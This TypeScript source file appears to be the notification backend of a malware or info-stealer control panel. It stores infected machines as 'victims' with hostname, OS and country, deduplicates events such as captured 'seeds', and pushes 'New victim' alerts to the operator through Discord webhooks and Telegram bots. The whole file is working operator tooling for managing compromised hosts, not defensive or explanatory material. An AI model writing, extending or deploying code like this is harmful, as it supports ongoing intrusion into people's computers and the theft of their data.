import { prisma } from '../lib/db';
import { env } from '../lib/env';
import { publish } from '../lib/bus';

type NotifyInput = {
  kind: string;
  title: string;
  body: string;
  victimId?: string | null;
  link?: string | null;
  /** Collapses identical events (same seed, same failed attachment, …). */
  dedupeKey?: string | null;
  dedupeMs?: number;
};

let lastSent = 0;
const recent = new Map<string, number>();

function throttleKey(input: NotifyInput): string {
  return `${input.kind}:${input.victimId ?? ''}:${input.title}`;
}

export async function notify(input: NotifyInput): Promise<void> {
  if (input.dedupeKey) {
    const since = new Date(Date.now() - (input.dedupeMs ?? 24 * 60 * 60 * 1000));
    const existing = await prisma.notification.findFirst({
      where: { dedupeKey: input.dedupeKey, createdAt: { gte: since } },
      select: { id: true, readAt: true }
    });
    if (existing) {
      if (existing.readAt) return;
      // An unread duplicate still refreshes the badge for live viewers.
      void publish({ type: 'notification', victimId: input.victimId ?? undefined, at: Date.now(), data: { id: existing.id, kind: input.kind, title: input.title, body: input.body, link: input.link ?? null, victim: await victimName(input.victimId) } });
      return;
    }
  }
  const notification = await prisma.notification.create({
    data: {
      kind: input.kind,
      title: input.title,
      body: input.body,
      victimId: input.victimId ?? null,
      link: input.link ?? null,
      dedupeKey: input.dedupeKey ?? null
    }
  });
  void publish({
    type: 'notification',
    victimId: input.victimId ?? undefined,
    at: Date.now(),
    data: { id: notification.id, kind: input.kind, title: input.title, body: input.body, link: input.link ?? null, victim: await victimName(input.victimId) }
  });

  const key = throttleKey(input);
  const now = Date.now();
  const previous = recent.get(key) ?? 0;
  if (now - previous < 30_000 || now - lastSent < 1200) return;
  recent.set(key, now);
  lastSent = now;

  const text = `**${input.title}**\n${input.body}`;
  if (env.DISCORD_WEBHOOK_URL) {
    void fetch(env.DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ content: text.slice(0, 1900), allowed_mentions: { parse: [] } })
    }).catch(() => undefined);
  }
  if (env.TELEGRAM_BOT_TOKEN && env.TELEGRAM_CHAT_ID) {
    void fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: env.TELEGRAM_CHAT_ID, text: text.slice(0, 3900), parse_mode: 'Markdown' })
    }).catch(() => undefined);
  }
}

async function victimName(victimId?: string | null): Promise<string> {
  if (!victimId) return '';
  const victim = await prisma.victim.findUnique({ where: { id: victimId }, select: { hostname: true } }).catch(() => null);
  return victim?.hostname ?? '';
}

export async function notifyVictimNew(victim: { id: string; hostname: string; os: string; country: string | null }): Promise<void> {
  await notify({
    kind: 'victim_new',
    victimId: victim.id,
    title: 'New victim',
    body: `${victim.hostname} · ${victim.os}${victim.country ? ` · ${victim.country}` : ''}`,
    link: `/victims/${victim.id}`
  });
}
